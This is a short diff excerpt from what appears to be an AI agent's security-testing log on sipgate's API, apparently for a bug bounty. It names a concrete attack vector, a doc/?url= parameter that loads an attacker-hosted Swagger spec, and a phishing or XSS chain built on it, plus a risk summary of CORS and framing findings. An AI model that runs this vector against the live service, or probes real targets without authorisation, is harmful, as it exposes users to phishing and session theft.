@@ -2961,3 +2961,4 @@ impact: phishing amplifier on api origin; full session read/write only if a scri
 testability: HUMAN_ONLY
 [NEXT] HUMAN: In Chromium open `https://api.sipgate.com/v2/doc/?url=https://<attacker>/spec.json` and record whether attacker-controlled spec HTML/JS is rendered into the api-origin DOM (spec-forward + frameable + implicit extreme-scope OAuth client chain) — the only remaining high-value api-surface vector; server-side probing is exhausted.
 [RISK] sipgate: 44 — Spec re-exposure + anomaly extended to a spec-claims-public GDPR subroute raises the authz-consistency story slightly, but it remains empty-body edge-noise requiring valid client UUIDs + scopes for any real feed; reportable set unchanged (/v2/* CORS creds, doc/?url= frameable swagger phishing chain, accepted family MISCONFIG). No critical unauthenticated vector without same-origin XSS or a token source.
+## 2026-09-12 11:17:26 UTC [target] (model bigpickle)
